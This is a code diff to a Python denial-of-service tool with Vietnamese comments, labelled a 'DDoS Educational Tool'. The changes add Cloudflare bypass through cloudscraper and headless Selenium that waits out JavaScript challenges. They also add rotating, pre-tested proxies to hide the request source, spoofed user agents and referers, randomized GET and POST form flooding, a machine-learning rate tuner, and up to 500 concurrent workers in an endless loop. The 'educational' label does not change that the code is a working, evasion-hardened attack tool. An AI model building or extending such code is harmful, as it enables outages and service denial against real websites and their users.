@@ -245,28 +245,14 @@ user_agents = [
     "Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 13; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
 ]
-
-# Hàm lấy proxy từ ProxyScrape API
-def get_proxy(max_attempts=3):
-    proxy_api_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
-    for attempt in range(max_attempts):
-        try:
-            response = requests.get(proxy_api_url, timeout=5)
-            response.raise_for_status()
-            proxies = response.text.strip().split("\n")
-            if proxies and proxies[0]:
-                proxy = random.choice(proxies)
-                return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-            print(f"Thử proxy lần {attempt + 1} thất bại: Không có proxy hợp lệ.")
-        except (RequestException, ValueError) as e:
-            print(f"Thử proxy lần {attempt + 1} thất bại: {str(e)}")
-        time.sleep(0.5)
-    return None
-
 # Phân tích website để thu thập URL và biểu mẫu
 def analyze_website(url):
     try:
-        response = requests.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=5)
+        scraper = cloudscraper.create_scraper()
+        response = scraper.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=5)
+        if response.status_code in [403, 429]:
+            print("Cloudflare phát hiện. Phân tích website thất bại.")
+            return {"urls": [url], "forms": []}
         soup = BeautifulSoup(response.text, "html.parser")
         urls = [a["href"] for a in soup.find_all("a", href=True) if a["href"].startswith(("http", "/"))]
         forms = [
@@ -274,16 +260,20 @@ def analyze_website(url):
             for form in soup.find_all("form")
         ]
         return {"urls": urls, "forms": forms}
-    except RequestException:
+    except RequestException as e:
+        print(f"Lỗi phân tích website: {str(e)}")
         return {"urls": [url], "forms": []}
 
 # AI để điều chỉnh tần suất yêu cầu
 class RateOptimizer:
     def __init__(self):
-        self.model = RandomForestClassifier(n_estimators=100)
+        self.model = RandomForestClassifier(n_estimators=50)  # Giảm số cây để tối ưu
         self.history = []
 
     def train(self, status_codes, success_labels):
+        if len(status_codes) != len(success_labels) or not status_codes:
+            print("Lỗi: Dữ liệu đầu vào không hợp lệ cho RandomForestClassifier.")
+            return
         if len(status_codes) > 10:
             X = np.array(status_codes).reshape(-1, 1)
             y = np.array(success_labels)
@@ -300,7 +290,7 @@ def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Colorate.Diagonal(Colors.purple_to_blue, """
     ╔══════════════════════════════════════════════════════╗
-    ║    DDoS Educational Tool . Version 3.5 | Cre by: LIGHT ║
+    ║    DDoS Educational Tool . Version 3.7 | Cre by: LIGHT ║
     ╚══════════════════════════════════════════════════════╝   
 
 ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
@@ -313,7 +303,7 @@ def banner():
                                                             
     """))
 
-async def simulate_request(url, rate_optimizer, website_data, success_count, failure_count, max_retries=3):
+async def simulate_request(url, rate_optimizer, website_data, success_count, failure_count, proxy_manager, max_retries=3):
     headers = {
         "User-Agent": random.choice(user_agents),
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
@@ -322,8 +312,20 @@ async def simulate_request(url, rate_optimizer, website_data, success_count, fai
         "Referer": "https://www.google.com",
         "Cache-Control": "no-cache"
     }
-    proxy = get_proxy()
-    scraper = cloudscraper.create_scraper()
+    proxy = await proxy_manager.get_proxy()
+    if not proxy:
+        print("Không có proxy khả dụng. Bỏ qua yêu cầu.")
+        failure_count[0] += 1
+        return None
+
+    # Kiểm tra proxy trước khi sử dụng
+    if not await proxy_manager.test_proxy(proxy):
+        print(f"Proxy {proxy['http']} không hoạt động. Thử proxy khác.")
+        proxy = await proxy_manager.get_proxy()
+        if not proxy:
+            print("Không có proxy khả dụng sau khi thử lại.")
+            failure_count[0] += 1
+            return None
 
     # Chọn ngẫu nhiên hành vi (GET hoặc POST)
     action = random.choice(["get", "post"]) if website_data["forms"] else "get"
@@ -341,31 +343,31 @@ async def simulate_request(url, rate_optimizer, website_data, success_count, fai
                         target_url,
                         headers=headers,
                         data=data,
-                        proxy=proxy["http"] if proxy else None,
-                        timeout=1
+                        proxy=proxy["http"],
+                        timeout=3  # Tăng timeout
                     )
                 else:
                     response = await session.get(
                         target_url,
                         headers=headers,
-                        proxy=proxy["http"] if proxy else None,
-                        timeout=1
+                        proxy=proxy["http"],
+                        timeout=3
                     )
                 status = response.status
                 print(Colorate.Horizontal(Colors.red_to_white, 
-                    f"[Async] {action.upper()} thành công | URL: {target_url} | Status: {status} | Proxy: {proxy['http'] if proxy else 'None'}"))
+                    f"[Async] {action.upper()} thành công | URL: {target_url} | Status: {status} | Proxy: {proxy['http']}"))
                 rate_optimizer.history.append((status, 1))
                 success_count[0] += 1
                 with open("ddos_log.txt", "a") as f:
-                    f.write(f"[{time.ctime()}] Success | Action: {action} | Status: {status} | URL: {target_url} | Proxy: {proxy['http'] if proxy else 'None'}\n")
+                    f.write(f"[{time.ctime()}] Success | Action: {action} | Status: {status} | URL: {target_url} | Proxy: {proxy['http']}\n")
                 return status
-        except (Timeout, ConnectionError, RequestException) as e:
+        except (Timeout, ConnectionError, aiohttp.ClientError) as e:
             print(Colorate.Horizontal(Colors.red_to_white, 
-                f"[Async] Lỗi: {str(e)} | Thử lại lần {attempt + 1}/{max_retries}"))
+                f"[Async] Lỗi: {str(e)} | Thử lại lần {attempt + 1}/{max_retries} | Proxy: {proxy['http']}"))
             rate_optimizer.history.append((429 if "429" in str(e) else 500, 0))
             failure_count[0] += 1
             with open("ddos_log.txt", "a") as f:
-                f.write(f"[{time.ctime()}] Failure | Action: {action} | Error: {str(e)} | URL: {target_url}\n")
+                f.write(f"[{time.ctime()}] Failure | Action: {action} | Error: {str(e)} | URL: {target_url} | Proxy: {proxy['http']}\n")
             if attempt == max_retries - 1:
                 print(Colorate.Horizontal(Colors.red_to_white, 
                     f"[Async] Bỏ qua yêu cầu sau {max_retries} lần thử."))
@@ -373,6 +375,8 @@ async def simulate_request(url, rate_optimizer, website_data, success_count, fai
                 try:
                     options = webdriver.ChromeOptions()
                     options.add_argument("--headless")
+                    if proxy:
+                        options.add_argument(f"--proxy-server={proxy['http']}")
                     driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
                     driver.get(target_url)
                     time.sleep(2)  # Chờ JS Challenge
@@ -383,7 +387,7 @@ async def simulate_request(url, rate_optimizer, website_data, success_count, fai
                     rate_optimizer.history.append((status, 1))
                     success_count[0] += 1
                     with open("ddos_log.txt", "a") as f:
-                        f.write(f"[{time.ctime()}] Success | Action: selenium | Status: {status} | URL: {target_url}\n")
+                        f.write(f"[{time.ctime()}] Success | Action: selenium | Status: {status} | URL: {target_url} | Proxy: {proxy['http']}\n")
                     return status
                 except Exception as e:
                     print(Colorate.Horizontal(Colors.red_to_white, 
@@ -392,6 +396,13 @@ async def simulate_request(url, rate_optimizer, website_data, success_count, fai
                     with open("ddos_log.txt", "a") as f:
                         f.write(f"[{time.ctime()}] Failure | Action: selenium | Error: {str(e)} | URL: {target_url}\n")
             await asyncio.sleep(0.1)
+        except Exception as e:
+            print(Colorate.Horizontal(Colors.red_to_white, 
+                f"[Async] Lỗi bất ngờ: {str(e)} | URL: {target_url}"))
+            with open("ddos_log.txt", "a") as f:
+                f.write(f"[{time.ctime()}] Unexpected Error: {str(e)} | URL: {target_url}\n")
+            failure_count[0] += 1
+            return None
     return None
 
 def main():
@@ -416,18 +427,21 @@ def main():
         f"Phân tích hoàn tất: {len(website_data['urls'])} URL, {len(website_data['forms'])} biểu mẫu"))
 
     rate_optimizer = RateOptimizer()
+    proxy_manager = ProxyManager()
     success_count = [0]
     failure_count = [0]
 
     async def run_requests():
         tasks = []
         for _ in range(threads):
-            tasks.append(simulate_request(url, rate_optimizer, website_data, success_count, failure_count))
+            tasks.append(simulate_request(url, rate_optimizer, website_data, success_count, failure_count, proxy_manager))
         await asyncio.gather(*tasks)
 
     loop = asyncio.get_event_loop()
     try:
-        with ThreadPoolExecutor(max_workers=500) as executor:
+        # Tối ưu số luồng dựa trên CPU
+        max_workers = min(500, psutil.cpu_count() * 100)
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
             while True:
                 # Huấn luyện AI dựa trên lịch sử phản hồi
                 if rate_optimizer.history:
